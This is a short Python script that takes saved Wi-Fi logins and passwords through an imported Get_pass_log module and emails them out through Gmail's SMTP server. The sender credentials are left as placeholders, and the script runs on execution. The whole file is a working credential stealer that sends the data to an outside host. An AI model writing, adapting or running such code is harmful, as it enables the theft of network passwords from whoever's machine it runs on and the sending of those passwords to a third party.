from Get_pass_log import *
import smtplib
from email.mime.text import MIMEText

class Give_my_email:

    def send_email(self, massage):
        sender = "your email" # example@gmail.com
        password = "your password" # 123456789

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()

        try:
            server.login(sender,password)
            msg = MIMEText(massage)
            msg["Subject"] = "Wi-fi!"
            server.sendmail(sender, sender, msg.as_string())
            return "Successfully"
        except Exception as _ex:
            return f"{_ex}\nCheck u login or password plz!"


    def main(self):
        message = Get_pass_log().get_wifi()
        print(Give_my_email().send_email(f" List format - Login/password{message}"))

Give_my_email().main()

